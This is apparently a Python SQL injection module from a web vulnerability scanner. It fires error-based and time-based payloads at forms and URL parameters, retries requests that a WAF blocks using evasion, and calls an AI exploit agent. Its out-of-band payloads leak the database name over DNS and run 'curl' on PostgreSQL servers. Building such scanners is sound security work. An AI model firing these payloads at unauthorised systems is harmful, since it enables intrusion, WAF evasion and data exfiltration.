"""
cyberm4fia-scanner - SQLi Module
SQL Injection detection
"""

import sys
import time
import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

from utils.request import (
    get_oob_client,
    get_thread_count,
    increment_vulnerability_count,
    smart_request,
)
from utils.colors import Colors, log_info, log_success, log_vuln, log_warning
from modules.payloads import (
    BLIND_SQLI_PAYLOADS,
    BLIND_SQLI_THRESHOLD,
    SQLI_PAYLOADS,
    SQLI_ERRORS,
)
from utils.payload_filter import PayloadFilter
from modules.smart_payload import probe_sqli_context
from utils.request import ScanExceptions

def detect_sqli(text):
    """Check response for SQL error patterns"""
    text_lower = text.lower()
    for error in SQLI_ERRORS:
        if error.lower() in text_lower:
            return error
    return None

def _check_sqli_error(
    resp, payload, target_name, url_or_action, method, data, smart_payloads, source=None
):
    """Helper to check reflection and log SQLi"""
    error = detect_sqli(resp.text)
    if error:
        increment_vulnerability_count()
        if not source:
            source = "🧠 Smart" if payload in smart_payloads else "📋 Static"
        log_vuln(f"SQLi VULNERABILITY FOUND! [{source}]")
        log_success(f"Target: {target_name} | Error: {error}")
        log_success(f"Payload: {payload}")
        return {
            "type": "SQLi_Form" if data else "SQLi_Param",
            ("field" if data else "param"): target_name,
            "payload": payload,
            "error": error,
            "url": url_or_action,
            "method": method if data else "get",
            "form_data": data if data else {},
            "source": source,
        }
    return None

import functools
from utils.concurrency import run_concurrent_tasks

def _test_sqli_form_payload(payload, inp, inputs, method, target, delay, smart):
    data = inputs.copy()
    data[inp] = payload
    try:
        if method == "post":
            resp = smart_request("post", target, data=data, delay=delay)
        else:
            resp = smart_request("get", target, params=data, delay=delay)

        vuln_found = _check_sqli_error(
            resp, payload, inp, target, method, data, smart
        )
        if vuln_found:
            return vuln_found

        from utils.waf import waf_detector

        if not waf_detector.is_waf_block(resp.status_code, resp.text):
            return None

        waf_name = waf_detector.detected_waf or "Generic WAF"
        log_warning(f"WAF Block ({waf_name}) detected on form field '{inp}'")

        def request_fn(p, *, evasion_level=0):
            data[inp] = p
            if method == "post":
                return smart_request(
                    "post", target, data=data, delay=delay, evasion_level=evasion_level
                )
            return smart_request(
                "get", target, params=data, delay=delay, evasion_level=evasion_level
            )

        def check_fn(response, p, source):
            return _check_sqli_error(
                response, p, inp, target, method, data, smart, source=source
            )

        from utils.waf_evasion import apply_waf_bypass_chain

        return apply_waf_bypass_chain(
            payload=payload,
            blocked_response=resp,
            request_fn=request_fn,
            check_fn=check_fn,
            waf_name=waf_name,
            vuln_label="SQL Injection",
        )
    except ScanExceptions:
        pass
    return None

def _test_sqli_param_payload(payload, param, params, parsed, delay, smart):
    test_params = params.copy()
    test_params[param] = [payload]
    test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
    try:
        resp = smart_request("get", test_url, delay=delay)
        vuln_found = _check_sqli_error(resp, payload, param, test_url, "get", None, smart)
        if vuln_found:
            return vuln_found

        from utils.waf import waf_detector
        if not waf_detector.is_waf_block(resp.status_code, resp.text):
            return None

        waf_name = waf_detector.detected_waf or "Generic WAF"
        log_warning(f"WAF Block ({waf_name}) detected on param '{param}'")

        nonlocal_state = {"test_url": test_url}

        def request_fn(p, *, evasion_level=0):
            test_params[param] = [p]
            url_for_call = urlunparse(
                parsed._replace(query=urlencode(test_params, doseq=True))
            )
            nonlocal_state["test_url"] = url_for_call
            return smart_request(
                "get", url_for_call, delay=delay, evasion_level=evasion_level
            )

        def check_fn(response, p, source):
            return _check_sqli_error(
                response,
                p,
                param,
                nonlocal_state["test_url"],
                "get",
                None,
                smart,
                source=source,
            )

        from utils.waf_evasion import apply_waf_bypass_chain

        return apply_waf_bypass_chain(
            payload=payload,
            blocked_response=resp,
            request_fn=request_fn,
            check_fn=check_fn,
            waf_name=waf_name,
            vuln_label="SQL Injection",
        )
    except ScanExceptions:
        pass
    return None

def scan_sqli(url, forms, delay, options=None, threads=None):
    from utils.tamper import get_tamper_chain
    if threads is None: threads = get_thread_count()
    options = options or {}
    target_context = options.get("target_context")

    chain = get_tamper_chain()
    payloads = list(SQLI_PAYLOADS)
    if chain.active:
        payloads = chain.apply_list(payloads)

    if target_context:
        payloads = PayloadFilter.filter_payloads(payloads, target_context)

    log_info(f"Testing SQLi with {len(payloads)} payloads ({threads} threads)...")
    tasks = []

    flattened_forms = []
    for f in forms:
        if isinstance(f, list): flattened_forms.extend(f)
        else: flattened_forms.append(f)

    for form in flattened_forms:
        if hasattr(form, "find_all"):
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            inputs = {}
            for i in form.find_all(["input", "textarea", "select"]):
                if i.get("name"): inputs[i.get("name")] = i.get("value", "1")
        else:
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            inputs = {}
            raw_inputs = form.get("inputs", [])
            for i in raw_inputs:
                if isinstance(i, dict) and i.get("name"):
                    inputs[i.get("name")] = i.get("value", "1")
            if not inputs and raw_inputs and isinstance(raw_inputs[0], str):
                for i in raw_inputs: inputs[i] = "1"

        if not inputs: continue

        for inp in inputs:
            if inp.lower() in ["submit", "btnsubmit", "login"]: continue
            # We don't do smart probing per form here, just run all payloads
            for payload in payloads:
                tasks.append(functools.partial(_test_sqli_form_payload, payload, inp, inputs, method, target, delay, []))

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    for param in params:
        flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        probe = probe_sqli_context(urlunparse(parsed), param, flat_params, method="get", delay=delay)
        smart = probe.get("smart_payloads", [])
        all_payloads = smart + [p for p in payloads if p not in smart] if smart else payloads
        for payload in all_payloads:
            tasks.append(functools.partial(_test_sqli_param_payload, payload, param, params, parsed, delay, smart))

    vulns = run_concurrent_tasks(tasks, max_workers=threads)

    # Remove duplicates (since multiple threads might find the same vuln)
    unique_vulns = []
    seen = set()
    for v in vulns:
        if not v: continue
        key = f"{v.get('type')}:{v.get('field', v.get('param'))}:{v.get('payload')}"
        if key not in seen:
            seen.add(key)
            unique_vulns.append(v)
    vulns = unique_vulns

    if not vulns and params:
        try:
            from utils.ai_exploit_agent import get_exploit_agent, ExploitContext
            agent = get_exploit_agent()
            if agent and agent.available:
                from utils.waf import waf_detector
                waf_name = getattr(waf_detector, "detected_waf", "") or ""
                for param in params:
                    ctx = ExploitContext(url=url, param=param, vuln_type="SQLi", waf=waf_name, http_method="GET")
                    result = agent.exploit_sqli(ctx)
                    if result and result.success:
                        increment_vulnerability_count()
                        log_info(f"[!!!] SQLi in: {param} [🤖 AI Agent Gen-{result.iteration}]")
                        vulns.append({
                            "type": "SQLi",
                            "param": param,
                            "payload": result.payload,
                            "url": url,
                            "source": f"🤖 AI Agent (confidence: {result.confidence:.0f}%)",
                            "evidence": result.evidence[:200],
                            "ai_curl": result.curl_command,
                            "ai_poc_script": result.python_script,
                            "ai_nuclei": result.nuclei_template,
                        })
                        break
        except ImportError:
            pass

    return vulns

def scan_blind_sqli(url, forms, delay, options=None):
    """Scan for blind SQL injection using time-based detection"""
    options = options or {}
    target_context = options.get("target_context")
    
    payloads = list(BLIND_SQLI_PAYLOADS)
    if target_context:
         payloads = PayloadFilter.filter_payloads(payloads, target_context)
         
    log_info(f"Testing Blind SQLi with {len(payloads)} payloads...")
    vulns = []

    oob_client = get_oob_client()
    oob_payloads = []
    if oob_client and oob_client.ready:
        # MySQL: LOAD_FILE or HEX based OOB
        oob_url = oob_client.generate_payload("SQLi", "form_input")
        # Removing http:// prefix for DNS-based tricks if URL contains the IP
        # For LocalOOBProvider it's http://IP:PORT/token
        oob_payloads.extend([
            f"'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT DATABASE()),'.{oob_url.replace('http://', '')}\\\\a'))-- ",
            f"'; EXEC master..xp_dirtree '//{oob_url.replace('http://', '')}/a'-- ",
            f"'; copy (select '') to program 'curl {oob_url}'-- "
        ])

    flattened_forms = []
    for f in forms:
        if isinstance(f, list):
            flattened_forms.extend(f)
        else:
            flattened_forms.append(f)

    # Test forms for Blind SQLi
    for form in flattened_forms:
        if hasattr(form, "find_all"):
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            # Extract inputs with values
            inputs = {}
            for i in form.find_all(["input", "textarea", "select"]):
                if i.get("name"):
                    inputs[i.get("name")] = i.get("value", "1")
        else:
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            inputs = {}
            raw_inputs = form.get("inputs", [])
            for i in raw_inputs:
                if isinstance(i, dict) and i.get("name"):
                    inputs[i.get("name")] = i.get("value", "1")
            if not inputs and raw_inputs and isinstance(raw_inputs[0], str):
                for i in raw_inputs:
                    inputs[i] = "1"

        if not inputs:
            continue

        for inp in inputs:
            # Skip Submit buttons
            if inp.lower() in ["submit", "btnsubmit", "login", "security"]:
                continue

            current_payloads = payloads + oob_payloads
            for payload in current_payloads:
                # Use only sleep payloads, time-based ones, or OOB payloads
                if (
                    "SLEEP" in payload.upper()
                    or "pg_sleep" in payload.lower()
                    or "WAITFOR" in payload.upper()
                    or (oob_client and oob_client.ready and any(p in payload for p in ["LOAD_FILE", "xp_dirtree", "curl"]))
                ):
                    # Preserve original values logic
                    data = inputs.copy()
                    data[inp] = payload

                    # Show progress (overwrite line)
                    sys.stdout.write(f"\r[*] Testing {inp}: {payload[:40]:<40}")
                    sys.stdout.flush()

                    try:
                        start = time.time()
                        smart_request(
                            method,
                            target,
                            data=data if method == "post" else None,
                            params=data if method != "post" else None,
                            delay=0,
                        )
                        elapsed = time.time() - start

                        if elapsed > BLIND_SQLI_THRESHOLD:
                            # Baseline check
                            base_data = inputs.copy()
                            base_data[inp] = "cybm4f1a_sqli_baseline"
                            start_base = time.time()
                            smart_request(
                                method,
                                target,
                                data=base_data if method == "post" else None,
                                params=base_data if method != "post" else None,
                                delay=0,
                            )
                            base_elapsed = time.time() - start_base

                            if base_elapsed < 2.0:
                                # Clear progress line
                                sys.stdout.write("\r" + " " * 60 + "\r")
                                sys.stdout.flush()

                                increment_vulnerability_count()

                                log_vuln("BLIND SQLi VULNERABILITY FOUND!")
                                log_success(
                                    f"Target slept for {elapsed:.2f}s! (Baseline: {base_elapsed:.2f}s, Threshold: {BLIND_SQLI_THRESHOLD}s)"
                                )
                                print(
                                    f"    {Colors.GREEN}└──> Payload confirmed: {payload}{Colors.END}"
                                )

                                vulns.append(
                                    {
                                        "type": "Blind_SQLi_Form",
                                        "field": inp,
                                        "payload": payload,
                                        "response_time": elapsed,
                                        "url": target,
                                        "method": method,
                                    }
                                )
                                break
                            else:
                                sys.stdout.write("\r" + " " * 60 + "\r")
                                sys.stdout.flush()
                                log_info(
                                    f"Ignored SQLi false positive on {inp} (Network delay: {base_elapsed:.2f}s)"
                                )
                            break  # Found one payload that works, move to next input
                    except httpx.RequestError:
                        pass  # Individual blind form payload failure

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    for param in params:
        current_payloads = BLIND_SQLI_PAYLOADS + oob_payloads
        for payload in current_payloads:
            if "SLEEP" in payload.upper() or "pg_sleep" in payload.lower() or (oob_client and oob_client.ready and any(p in payload for p in ["LOAD_FILE", "xp_dirtree", "curl"])):
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = urlunparse(
                    parsed._replace(query=urlencode(test_params, doseq=True))
                )

                try:
                    start = time.time()
                    smart_request("get", test_url, delay=0)  # No extra delay for timing
                    elapsed = time.time() - start

                    if elapsed > BLIND_SQLI_THRESHOLD:
                        # Baseline check
                        base_params = params.copy()
                        base_params[param] = ["cybm4f1a_sqli_baseline"]
                        base_url = urlunparse(
                            parsed._replace(query=urlencode(base_params, doseq=True))
                        )
                        start_base = time.time()
                        smart_request("get", base_url, delay=0)
                        base_elapsed = time.time() - start_base

                        if base_elapsed < 2.0:
                            increment_vulnerability_count()

                            log_vuln("BLIND SQLi VULNERABILITY FOUND!")
                            log_success(
                                f"Param: {param} | Delay: {elapsed:.2f}s (Baseline: {base_elapsed:.2f}s)"
                            )
                            log_success(f"Payload: {payload}")

                            vulns.append(
                                {
                                    "type": "Blind_SQLi_Param",
                                    "param": param,
                                    "payload": payload,
                                    "response_time": elapsed,
                                    "url": test_url,
                                }
                            )
                            break
                        else:
                            log_info(
                                f"Ignored SQLi false positive on {param} (Network delay: {base_elapsed:.2f}s)"
                            )
                            break
                except ScanExceptions:
                    pass  # Individual blind param payload failure

    return vulns
